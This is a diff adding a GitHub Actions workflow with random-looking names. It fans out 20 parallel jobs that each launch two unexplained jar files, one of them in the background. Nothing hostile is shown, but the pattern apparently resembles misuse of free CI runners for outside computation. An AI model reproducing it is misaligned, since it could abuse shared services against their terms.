@@ -1,0 +1,26 @@
+name: DonnaJones8336527073
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-files:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job-name: [JB0,JB1,JB2,JB3,JB4,JB5,JB6,JB7,JB8,JB9,JB10,JB11,JB12,JB13,JB14,JB15,JB16,JB17,JB18,JB19]
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up JDK
+        uses: actions/setup-java@v3
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Run Java Files
+        shell: pwsh
+        run: |
+          Start-Process java -ArgumentList "-jar", "AshleyGreen6090855001.jar"
+          java -jar AnthonyKing2740215910.jar
